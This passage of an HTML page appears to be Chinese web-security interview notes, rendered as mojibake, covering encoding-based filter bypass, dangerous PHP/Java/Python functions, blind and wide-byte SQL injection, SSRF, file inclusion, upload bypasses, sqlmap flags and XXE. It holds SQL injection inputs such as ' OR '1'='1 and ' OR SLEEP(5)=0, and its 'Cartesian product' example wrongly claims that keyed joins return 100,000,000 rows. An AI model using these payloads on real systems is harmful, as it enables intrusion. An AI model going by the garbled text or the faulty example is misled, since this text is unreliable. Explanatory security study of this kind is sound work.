ï¼Œå¯ä»¥ç»•è¿‡ä¸€äº›ç®€å•çš„å­—ç¬¦è¿‡æ»¤æœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œå¦‚æœâ€™ï¼ˆå•å¼•å·ï¼‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨0x27æ¥ä»£æ›¿ã€‚</li><li>ä½¿ç”¨URLç¼–ç ï¼šURLç¼–ç æ˜¯ä¸€ç§å°†å­—ç¬¦è½¬æ¢ä¸º%åè·Ÿä¸¤ä½åå…­è¿›åˆ¶æ•°çš„æ–¹æ³•ï¼Œè¿™å¯ä»¥ç»•è¿‡ä¸€äº›åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„å®‰å…¨æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œ%22æ˜¯åŒå¼•å·â€çš„URLç¼–ç ï¼Œ%3Cæ˜¯å°äºå·&lt;çš„URLç¼–ç ã€‚</li></ul><h2 id="åœ¨PHPã€Javaå’ŒPythonä¸­ï¼Œæ‰§è¡Œä»£ç ã€è¯»å–æ–‡ä»¶å’Œæ‰§è¡Œå‘½ä»¤çš„ç›¸å…³å‡½æ•°å¦‚ä¸‹ï¼š"><a href="#åœ¨PHPã€Javaå’ŒPythonä¸­ï¼Œæ‰§è¡Œä»£ç ã€è¯»å–æ–‡ä»¶å’Œæ‰§è¡Œå‘½ä»¤çš„ç›¸å…³å‡½æ•°å¦‚ä¸‹ï¼š" class="headerlink" title="åœ¨PHPã€Javaå’ŒPythonä¸­ï¼Œæ‰§è¡Œä»£ç ã€è¯»å–æ–‡ä»¶å’Œæ‰§è¡Œå‘½ä»¤çš„ç›¸å…³å‡½æ•°å¦‚ä¸‹ï¼š"></a>åœ¨PHPã€Javaå’ŒPythonä¸­ï¼Œæ‰§è¡Œä»£ç ã€è¯»å–æ–‡ä»¶å’Œæ‰§è¡Œå‘½ä»¤çš„ç›¸å…³å‡½æ•°å¦‚ä¸‹ï¼š</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>ä»£ç æ‰§è¡Œ</p><ul><li><code>eval()</code>: æŠŠå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚</li><li><code>assert()</code>: æ‰§è¡Œä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç ï¼ˆéœ€è¦å¼€å¯assertionï¼‰ã€‚</li><li><code>create_function()</code>: åˆ›å»ºä¸€ä¸ªåŒ¿åï¼ˆLambdaé£æ ¼ï¼‰å‡½æ•°ï¼ˆå·²åœ¨PHP 7.2ä¸­åºŸå¼ƒï¼‰ã€‚</li><li><code>call_user_func()</code> å’Œ <code>call_user_func_array()</code>: è°ƒç”¨å›è°ƒå‡½æ•°ã€‚</li></ul><p>æ–‡ä»¶è¯»å–</p><ul><li><code>file_get_contents()</code>: è¯»å–æ•´ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚</li><li><code>highlight_file()</code>: æ˜¾ç¤ºæ–‡ä»¶çš„æºä»£ç å¹¶é«˜äº®æ˜¾ç¤ºå…³é”®å­—ã€‚</li><li><code>fopen()</code>, <code>readfile()</code>, <code>fread()</code>, <code>fgets()</code>, <code>fgetss()</code>: ç”¨äºæ‰“å¼€æ–‡ä»¶ã€è¯»å–æ–‡ä»¶å†…å®¹ã€‚</li><li><code>parse_ini_file()</code>: è§£æé…ç½®æ–‡ä»¶ã€‚</li><li><code>show_source()</code>: æ˜¾ç¤ºæ–‡ä»¶æºä»£ç ã€‚</li><li><code>file()</code>: å°†æ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæ¯è¡Œä½œä¸ºä¸€ä¸ªæ•°ç»„å…ƒç´ ã€‚</li></ul><p>å‘½ä»¤æ‰§è¡Œ</p><ul><li><code>system()</code>: æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶æ˜¾ç¤ºè¾“å‡ºã€‚</li><li><code>exec()</code>: æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶è¿”å›è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²ã€‚</li><li><code>shell_exec()</code>: æ‰§è¡Œå¤–éƒ¨shellå‘½ä»¤ï¼Œå¹¶è¿”å›å®Œæ•´çš„è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²ã€‚</li><li><code>passthru()</code>: æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¼ é€’åŸå§‹è¾“å‡ºç›´æ¥åˆ°æµè§ˆå™¨ã€‚</li><li><code>pcntl_exec()</code>: åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åºï¼ˆéœ€è¦pcntlæ‰©å±•ï¼‰ã€‚</li><li><code>popen()</code> å’Œ <code>proc_open()</code>: æ‰§è¡Œå‘½ä»¤å¹¶æ‰“å¼€ç”¨äºè¾“å…¥å’Œ&#x2F;æˆ–è¾“å‡ºçš„æ–‡ä»¶æŒ‡é’ˆã€‚</li></ul><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>ä»£ç æ‰§è¡Œ: Javaè¯­è¨€æœ¬èº«ä¸æä¾›ç›´æ¥æ‰§è¡Œå­—ç¬¦ä¸²ä»£ç çš„å‡½æ•°ï¼Œå› ä¸ºè¿™ä¼šå¸¦æ¥ä¸¥é‡çš„å®‰å…¨é£é™©ã€‚Javaé€šè¿‡ç¼–è¯‘æ‰§è¡Œå­—èŠ‚ç ï¼Œé€šå¸¸éœ€è¦é€šè¿‡ç±»åŠ è½½å™¨åŠ è½½ç±»æ–‡ä»¶ã€‚</p><p>æ–‡ä»¶è¯»å–</p><ul><li><code>java.nio.file.Files</code> ç±»ä¸­çš„ <code>readAllBytes()</code>, <code>readAllLines()</code>: è¯»å–æ–‡ä»¶çš„æ‰€æœ‰å­—èŠ‚æˆ–è¡Œã€‚</li><li><code>java.io</code> åŒ…ä¸­çš„ <code>FileInputStream</code>, <code>BufferedReader</code>: ç”¨äºè¯»å–æ–‡ä»¶çš„å­—èŠ‚æµå’Œå­—ç¬¦æµã€‚</li></ul><p>å‘½ä»¤æ‰§è¡Œ</p><ul><li><code>Runtime.getRuntime().exec()</code>: æ‰§è¡ŒæŒ‡å®šå‘½ä»¤å¹¶è¿”å›<code>Process</code>å¯¹è±¡ã€‚</li><li><code>ProcessBuilder</code>: å¯åŠ¨æ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡å’Œå·¥ä½œç›®å½•ã€‚</li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>ä»£ç æ‰§è¡Œ</p><ul><li><code>exec()</code>: æ‰§è¡ŒåŠ¨æ€ç”Ÿæˆçš„Pythonä»£ç å­—ç¬¦ä¸²ã€‚</li><li><code>eval()</code>: è®¡ç®—å­—ç¬¦ä¸²è¡¨è¾¾å¼çš„å€¼ï¼Œå¹¶è¿”å›ç»“æœã€‚</li><li><code>compile()</code>: å°†å­—ç¬¦ä¸²ç¼–è¯‘æˆä»£ç å¯¹è±¡ï¼Œå¯ä»¥å’Œ<code>exec()</code>æˆ–<code>eval()</code>ä¸€èµ·ä½¿ç”¨ã€‚</li></ul><p>æ–‡ä»¶è¯»å–</p><ul><li><code>open()</code>: æ‰“å¼€æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å¯¹è±¡ã€‚</li><li><code>read()</code>, <code>readline()</code>, <code>readlines()</code>: ä»æ–‡ä»¶å¯¹è±¡ä¸­è¯»å–å†…å®¹ã€‚</li><li><code>pathlib.Path.read_text()</code>: è¯»å–æ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ã€‚</li></ul><p>å‘½ä»¤æ‰§è¡Œ</p><ul><li><code>os.system()</code>: æ‰§è¡Œå‘½ä»¤å¹¶ç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæ¯•ã€‚</li><li><code>subprocess.run()</code>, <code>subprocess.Popen()</code>: æ‰§è¡Œå‘½ä»¤å¹¶æä¾›æ›´å¤šæ§åˆ¶ï¼Œå¦‚æ•è·è¾“å‡ºã€‚</li></ul><h2 id="ç›²æ³¨æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆç›²æ³¨"><a href="#ç›²æ³¨æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆç›²æ³¨" class="headerlink" title="ç›²æ³¨æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆç›²æ³¨"></a>ç›²æ³¨æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆç›²æ³¨</h2><p>ç›²æ³¨æ˜¯åœ¨ SQL æ³¨å…¥æ”»å‡»è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨å…³é—­äº†é”™è¯¯å›æ˜¾ï¼Œæˆ‘ä»¬å•çº¯é€šè¿‡æœåŠ¡å™¨è¿”å›å†…å®¹çš„å˜åŒ–æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥å’Œåˆ©ç”¨çš„æ–¹å¼ã€‚</p><p>ç›²æ³¨çš„æ‰‹æ®µæœ‰ä¸¤ç§ï¼š<br>ä¸€ä¸ªæ˜¯é€šè¿‡é¡µé¢çš„è¿”å›å†…å®¹æ˜¯å¦æ­£ç¡®(boolean-based)ï¼Œæ¥éªŒè¯æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼›<br>ä¸€ä¸ªæ˜¯é€šè¿‡ sql è¯­å¥å¤„ç†æ—¶é—´çš„ä¸åŒæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥(time-based)ï¼Œå¯ä»¥ç”¨ benchmarkï¼Œsleep ç­‰é€ æˆå»¶æ—¶æ•ˆæœçš„å‡½æ•°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ„é€ å¤§ç¬›å¡å°”ç§¯çš„è”åˆæŸ¥è¯¢è¡¨æ¥è¾¾åˆ°å»¶æ—¶çš„ç›®çš„ã€‚</p><ol><li><p><strong>Boolean-basedç›²æ³¨</strong>ï¼š</p><ul><li>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåŸºäºç”¨æˆ·è¾“å…¥çš„æŸ¥è¯¢ï¼Œä¾‹å¦‚ï¼š<code>SELECT * FROM users WHERE username = &#39;&quot; . $username . &quot;&#39; AND password = &#39;&quot; . $password . &quot;&#39;&quot;</code></li><li>æ”»å‡»è€…å¯èƒ½ä¼šå°è¯•å‘é€ä¸€ä¸ªç”¨æˆ·åï¼Œå…¶ä¸­åŒ…å«SQLé€»è¾‘ï¼Œä¾‹å¦‚ï¼š<code>&#39; OR &#39;1&#39;=&#39;1</code></li><li>å¦‚æœè¿™ä¸ªæŸ¥è¯¢å¯¼è‡´è¿”å›æ‰€æœ‰ç”¨æˆ·ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æ¨æ–­å‡ºæ³¨å…¥æ˜¯å¯èƒ½çš„ã€‚</li></ul></li><li><p><strong>Time-basedç›²æ³¨</strong>ï¼š</p><ul><li>ä½¿ç”¨<code>SLEEP()</code>å‡½æ•°æ¥å»¶è¿Ÿå“åº”æ—¶é—´ï¼Œä¾‹å¦‚ï¼š<code>&#39; OR SLEEP(5)=0</code></li><li>å¦‚æœå“åº”æ—¶é—´æ˜æ˜¾å˜é•¿ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æ¨æ–­å‡ºæ³¨å…¥æ˜¯å¯èƒ½çš„ã€‚</li></ul></li></ol><p>ç¬›å¡å°”ç§¯æ˜¯æŒ‡ä¸¤ä¸ªé›†åˆçš„æ‰€æœ‰å¯èƒ½çš„æœ‰åºå¯¹çš„é›†åˆã€‚åœ¨æ•°æ®åº“æŸ¥è¯¢ä¸­ï¼Œå¦‚æœä¸¤ä¸ªè¡¨è¿›è¡Œç¬›å¡å°”ç§¯æŸ¥è¯¢ï¼Œé‚£ä¹ˆä¼šè¿”å›ä¸¤ä¸ªè¡¨è¡Œæ•°ç›¸ä¹˜çš„ç»“æœé›†ã€‚</p><p><strong>å¤§ç¬›å¡å°”ç§¯</strong>æ˜¯æŒ‡æ„é€ ä¸€ä¸ªæŸ¥è¯¢ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœé›†éå¸¸å¤§ï¼Œä»è€Œæ˜¾è‘—å¢åŠ æŸ¥è¯¢çš„æ‰§è¡Œæ—¶é—´ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">JOIN</span> addresses <span class="keyword">ON</span> users.id <span class="operator">=</span> addresses.user_id</span><br><span class="line"><span class="keyword">JOIN</span> orders <span class="keyword">ON</span> users.id <span class="operator">=</span> orders.user_id</span><br><span class="line"><span class="keyword">WHERE</span> users.username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>users</code>è¡¨æœ‰1000è¡Œï¼Œ<code>addresses</code>è¡¨æœ‰500è¡Œï¼Œ<code>orders</code>è¡¨æœ‰200è¡Œï¼Œé‚£ä¹ˆè¿™ä¸ªæŸ¥è¯¢å¯èƒ½ä¼šè¿”å›100,000,000ï¼ˆ1000 * 500 * 200ï¼‰è¡Œç»“æœï¼Œè¿™å°†æ˜¾è‘—å¢åŠ æŸ¥è¯¢çš„æ‰§è¡Œæ—¶é—´ï¼Œä»è€Œå¯ä»¥ç”¨æ¥è¿›è¡Œæ—¶é—´ç›²æ³¨æ”»å‡»ã€‚</p><h2 id="å®½å­—èŠ‚æ³¨å…¥äº§ç”ŸåŸç†ä»¥åŠæ ¹æœ¬åŸå› "><a href="#å®½å­—èŠ‚æ³¨å…¥äº§ç”ŸåŸç†ä»¥åŠæ ¹æœ¬åŸå› " class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥äº§ç”ŸåŸç†ä»¥åŠæ ¹æœ¬åŸå› "></a>å®½å­—èŠ‚æ³¨å…¥äº§ç”ŸåŸç†ä»¥åŠæ ¹æœ¬åŸå› </h2><p>1ï¼‰äº§ç”ŸåŸç†ï¼šåœ¨æ•°æ®åº“ä½¿ç”¨äº†å®½å­—ç¬¦é›†è€Œ WEB ä¸­æ²¡è€ƒè™‘è¿™ä¸ªé—®é¢˜çš„æƒ…å†µä¸‹ï¼Œç”±äº 0xBF27 æ˜¯ä¸¤ä¸ªå­—ç¬¦ï¼Œåœ¨ PHP ä¸­ addslash å’Œ magic_quotes_gpc å¼€å¯æ—¶ï¼Œä¼šå¯¹ 0x27 å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œå› æ­¤ 0xbf27 ä¼šå˜æˆ 0xbf5c27ã€‚<br>è€Œæ•°æ®è¿›å…¥æ•°æ®åº“ä¸­æ—¶ï¼Œç”±äº 0XBF5C æ˜¯ä¸€ä¸ªå¦å¤–çš„å­—ç¬¦ï¼Œå› æ­¤è½¬ä¹‰ç¬¦å·ä¼šè¢«å‰é¢çš„ bf å¸¦ç€â€œåƒæ‰â€ï¼Œå•å¼•å·ç”±æ­¤é€ƒé€¸å‡ºæ¥å¯ä»¥ç”¨æ¥é—­åˆåˆè¯­å¥ã€‚<br>2ï¼‰æ ¹æœ¬åŸå› ï¼š<br>character_set_clientï¼ˆå®¢æˆ·ç«¯çš„å­—ç¬¦é›†ï¼‰å’Œ character_set_connectionï¼ˆè¿æ¥å±‚çš„å­—ç¬¦é›†ï¼‰ä¸åŒï¼Œæˆ–è½¬æ¢å‡½æ•°å¦‚ï¼Œiconvã€mb_convert_encoding ä½¿ç”¨ä¸å½“ã€‚<br>3ï¼‰è§£å†³åŠæ³•ï¼šç»Ÿä¸€æ•°æ®åº“ã€Web åº”ç”¨ã€æ“ä½œç³»ç»Ÿæ‰€ä½¿ç”¨çš„å­—ç¬¦é›†ï¼Œé¿å…è§£æäº§ç”Ÿå·®å¼‚ï¼Œæœ€å¥½éƒ½è®¾ç½®ä¸º UTF-8ã€‚æˆ–å¯¹æ•°æ®è¿›è¡Œæ­£ç¡®çš„è½¬ä¹‰ï¼Œå¦‚ mysql_real_escape_string+mysql_set_charset çš„ä½¿ç”¨ã€‚</p><h2 id="mysql-çš„ç½‘ç«™æ³¨å…¥-5-0-ä»¥ä¸Šå’Œ-5-0-ä»¥ä¸‹æœ‰ä»€ä¹ˆåŒºåˆ«"><a href="#mysql-çš„ç½‘ç«™æ³¨å…¥-5-0-ä»¥ä¸Šå’Œ-5-0-ä»¥ä¸‹æœ‰ä»€ä¹ˆåŒºåˆ«" class="headerlink" title="mysql çš„ç½‘ç«™æ³¨å…¥ 5.0 ä»¥ä¸Šå’Œ 5.0 ä»¥ä¸‹æœ‰ä»€ä¹ˆåŒºåˆ«"></a>mysql çš„ç½‘ç«™æ³¨å…¥ 5.0 ä»¥ä¸Šå’Œ 5.0 ä»¥ä¸‹æœ‰ä»€ä¹ˆåŒºåˆ«</h2><p>5.0 ä»¥ä¸‹æ²¡æœ‰ information_schema è¿™ä¸ªç³»ç»Ÿè¡¨ï¼Œæ— æ³•åˆ—è¡¨åç­‰ï¼Œåªèƒ½æš´åŠ›è·‘è¡¨åï¼›<br>5.0 ä»¥ä¸‹æ˜¯å¤šç”¨æˆ·å•æ“ä½œï¼Œ5.0 ä»¥ä¸Šæ˜¯å¤šç”¨æˆ·å¤šæ“ä½œã€‚</p><h2 id="SSRF-æ¼æ´çš„éªŒè¯æ–¹æ³•"><a href="#SSRF-æ¼æ´çš„éªŒè¯æ–¹æ³•" class="headerlink" title="SSRF æ¼æ´çš„éªŒè¯æ–¹æ³•"></a>SSRF æ¼æ´çš„éªŒè¯æ–¹æ³•</h2><p>å› ä¸º SSRF æ¼æ´æ˜¯è®©æœåŠ¡å™¨å‘é€è¯·æ±‚çš„å®‰å…¨æ¼æ´ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯å¦æ˜¯ç”±æœåŠ¡å™¨æ‰€å‘é€çš„ï¼Œä»è€Œæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SSRF æ¼æ´ï¼›<br>åœ¨é¡µé¢æºç ä¸­æŸ¥æ‰¾è®¿é—®çš„èµ„æºåœ°å€ï¼Œå¦‚æœè¯¥èµ„æºåœ°å€ç±»å‹ä¸º <a href="http://www.baidu.com/xxx.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8">www.baidu.com/xxx.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨</a> SSRF æ¼æ´ã€‚</p><h2 id="SSRF-æ¼æ´çš„æˆå› ã€é˜²å¾¡ã€ç»•è¿‡"><a href="#SSRF-æ¼æ´çš„æˆå› ã€é˜²å¾¡ã€ç»•è¿‡" class="headerlink" title="SSRF æ¼æ´çš„æˆå› ã€é˜²å¾¡ã€ç»•è¿‡"></a>SSRF æ¼æ´çš„æˆå› ã€é˜²å¾¡ã€ç»•è¿‡</h2><p>æˆå› ï¼šæ¨¡æ‹ŸæœåŠ¡å™¨å¯¹å…¶ä»–æœåŠ¡å™¨èµ„æºè¿›è¡Œè¯·æ±‚ï¼Œæ²¡æœ‰åšåˆæ³•æ€§éªŒè¯ã€‚<br>åˆ©ç”¨ï¼šæ„é€ æ¶æ„å†…ç½‘ IP åšæ¢æµ‹ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä½™æ‰€æ”¯æŒçš„åè®®å¯¹å…¶ä½™æœåŠ¡è¿›è¡Œæ”»å‡»ã€‚é˜²å¾¡ï¼šç¦æ­¢è·³è½¬ï¼Œé™åˆ¶åè®®ï¼Œå†…å¤–ç½‘é™åˆ¶ï¼ŒURL é™åˆ¶ã€‚<br>ç»•è¿‡ï¼šä½¿ç”¨ä¸åŒåè®®ï¼Œé’ˆå¯¹ IPï¼ŒIP æ ¼å¼çš„ç»•è¿‡ï¼Œé’ˆå¯¹ URLï¼Œæ¶æ„ URL å¢æ·»å…¶ä»–å­—ç¬¦ï¼Œ@ä¹‹ç±»çš„ã€‚301 è·³è½¬+dns rebindingã€‚</p><h2 id="å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°"><a href="#å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°" class="headerlink" title="å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°"></a>å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°</h2><p>PHPï¼šinclude(), include_once(), require(), require_once(), fopen(), readfile()<br>JSP&#x2F;Servletï¼šjava.io.File(), java.io.FileReader()<br>ASPï¼šinclude file, include virtual</p><h4 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h4><p>åœ¨PHPä¸­ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°å…è®¸ä½ å°†ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºå¦ä¸€ä¸ªæ–‡ä»¶çš„ä¸€éƒ¨åˆ†åŒ…å«è¿›æ¥ã€‚è¿™äº›å‡½æ•°å¯ä»¥åŒ…å«æ–‡æœ¬æ–‡ä»¶ã€PHPè„šæœ¬æˆ–å…¶ä»–ä»»ä½•ç±»å‹çš„æ–‡ä»¶ã€‚å¦‚æœè¢«åŒ…å«çš„æ–‡ä»¶ä¸­åŒ…å«PHPä»£ç ï¼Œé‚£ä¹ˆè¿™æ®µä»£ç ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚</p><ul><li><code>include()</code>: å¦‚æœæ–‡ä»¶æ‰¾ä¸åˆ°ï¼Œä¼šå‘å‡ºä¸€ä¸ªè­¦å‘Šï¼Œä½†è„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</li><li><code>include_once()</code>: ç±»ä¼¼äº<code>include()</code>ï¼Œä½†å³ä½¿æ–‡ä»¶è¢«å¤šæ¬¡åŒ…å«ï¼Œä¹Ÿåªä¼šåŒ…å«ä¸€æ¬¡ã€‚</li><li><code>require()</code>: å¦‚æœæ–‡ä»¶æ‰¾ä¸åˆ°ï¼Œä¼šå‘å‡ºä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼Œè„šæœ¬ä¼šåœæ­¢æ‰§è¡Œã€‚</li><li><code>require_once()</code>: ç±»ä¼¼äº<code>require()</code>ï¼Œä½†å³ä½¿æ–‡ä»¶è¢«å¤šæ¬¡åŒ…å«ï¼Œä¹Ÿåªä¼šåŒ…å«ä¸€æ¬¡ã€‚</li><li><code>fopen()</code>: æ‰“å¼€æ–‡ä»¶æˆ–è€…URLï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆã€‚</li><li><code>readfile()</code>: è¯»å–æ–‡ä»¶å¹¶è¾“å‡ºåˆ°æµè§ˆå™¨ã€‚</li></ul><h4 id="JSP-Servlet"><a href="#JSP-Servlet" class="headerlink" title="JSP&#x2F;Servlet"></a>JSP&#x2F;Servlet</h4><p>åœ¨Javaçš„JSPå’ŒServletä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>java.io.File</code>å’Œ<code>java.io.FileReader</code>ç±»æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚</p><ul><li><code>java.io.File()</code>: åˆ›å»ºä¸€ä¸ªFileå¯¹è±¡ï¼Œè¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•ã€‚</li><li><code>java.io.FileReader()</code>: åˆ›å»ºä¸€ä¸ªFileReaderå¯¹è±¡ï¼Œç”¨äºè¯»å–å­—ç¬¦æ–‡ä»¶ã€‚</li></ul><h4 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h4><p>åœ¨ASPï¼ˆActive Server Pagesï¼‰ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°æ¥åŒ…å«æ–‡ä»¶ï¼š</p><ul><li><code>include file</code>: åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥æ˜¯ASPæ–‡ä»¶æˆ–å…¶ä»–æ–‡æœ¬æ–‡ä»¶ã€‚</li><li><code>include virtual</code>: ç±»ä¼¼äº<code>include file</code>ï¼Œä½†å¯ä»¥åŒ…å«è™šæ‹Ÿè·¯å¾„ä¸­çš„æ–‡ä»¶ã€‚</li></ul><h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡æ–¹æ³•"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡æ–¹æ³•" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡æ–¹æ³•"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´ç»•è¿‡æ–¹æ³•</h2><p>å‰ç«¯ Js ç»•è¿‡ã€é»‘ç™½åå•ç»•è¿‡ã€æ–‡ä»¶ç±»å‹ç»•è¿‡ï¼ˆmimeã€æ–‡ä»¶å¤´ã€æ–‡ä»¶å†…å®¹ï¼‰ã€è·¯å¾„æˆªæ–­ç»•è¿‡ï¼ˆ00 æˆªæ–­ï¼‰ã€ä¸­é—´ä»¶è§£ææ¼æ´ã€æ¡ä»¶ç«äº‰ã€äºŒæ¬¡æ¸²æŸ“ã€ç¼–è¾‘å™¨æ¼æ´</p><h2 id="æ–‡ä»¶ä¸Šä¼ é˜²å¾¡æ–¹æ³•"><a href="#æ–‡ä»¶ä¸Šä¼ é˜²å¾¡æ–¹æ³•" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ é˜²å¾¡æ–¹æ³•"></a>æ–‡ä»¶ä¸Šä¼ é˜²å¾¡æ–¹æ³•</h2><p>ä¸Šä¼ ç›®å½•çš„ç”¨æˆ·æ‰§è¡Œæƒé™å…¨éƒ¨å–æ¶ˆã€åˆ¤æ–­æ–‡ä»¶ç±»å‹ã€ä½¿ç”¨éšæœºæ•°æ”¹å†™æ–‡ä»¶åå’Œæ–‡ä»¶è·¯å¾„ã€ç½‘ç«™æœåŠ¡å™¨å’Œæ–‡ä»¶æœåŠ¡å™¨åˆ†ç¦»ã€ç™½åå•æ£€æŸ¥ã€é™åˆ¶æ–‡ä»¶å¤§å°</p><h2 id="Sqlmapå¸¸ç”¨å‚æ•°"><a href="#Sqlmapå¸¸ç”¨å‚æ•°" class="headerlink" title="Sqlmapå¸¸ç”¨å‚æ•°"></a>Sqlmapå¸¸ç”¨å‚æ•°</h2><p>-uï¼ˆæŒ‡å®šurlï¼‰ã€-rï¼ˆè¯»å–éœ€è¦æ³¨å…¥çš„postè¯·æ±‚çš„æ–‡æœ¬ï¼‰ã€-mï¼ˆæ‰¹é‡è·‘getæ³¨å…¥ï¼‰ã€-pï¼ˆæŒ‡å®šæ³¨å…¥å‚æ•°ï¼‰ã€â€“current-dbï¼ˆè·å–å½“å‰æ•°æ®åº“ï¼‰ã€â€“tableï¼ˆæšä¸¾æ•°æ®åº“è¡¨ï¼‰ã€â€“tamperï¼ˆä½¿ç”¨è¿‡wafè„šæœ¬ï¼‰</p><h2 id="XXE-æ¼æ´åŸç†ä¸é˜²å¾¡"><a href="#XXE-æ¼æ´åŸç†ä¸é˜²å¾¡" class="headerlink" title="XXE æ¼æ´åŸç†ä¸é˜²å¾¡"></a>XXE æ¼æ´åŸç†ä¸é˜²å¾¡</h2><p>åŸç†ï¼šXXEï¼ˆXML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼ŒXML External Entityï¼‰ï¼Œåœ¨åº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶ï¼Œå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œå¯æ„é€ æ¶æ„å†…å®¹ï¼Œå¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ· DoS æ‹’ç»æœåŠ¡æ”»å‡»ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰ã€‚<br>Java ä¸­çš„ XXE æ”¯æŒ sun.net.<a href="http://www.protocol/">www.protocol</a> é‡Œçš„æ‰€æœ‰åè®®ï¼šhttpï¼Œhttpsï¼Œfileï¼Œftpï¼Œmailtoï¼Œjarï¼Œnetdocã€‚ä¸€èˆ¬åˆ©ç”¨ file åè®®è¯»å–æ–‡ä»¶ï¼Œåˆ©ç”¨ http åè®®æ¢æµ‹å†…ç½‘ã€‚<br>é˜²å¾¡ï¼šé…ç½® XML å¤„ç†å™¨ä½¿ç”¨ç¦ç”¨ DTDã€ç¦æ­¢å¤–éƒ¨å®ä½“è§£æã€é€šè¿‡é»‘åå•è¿‡æ»¤ç”¨æˆ·æäº¤çš„ XML æ•°æ®ã€‚<br>XXEï¼ˆXML External Entityï¼‰æ¼æ´æ˜¯ä¸€ç§å¸¸è§çš„å®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…é€šè¿‡æ¶æ„æ„é€ çš„XMLæ•°æ®æ¥è®¿é—®æˆ–ç 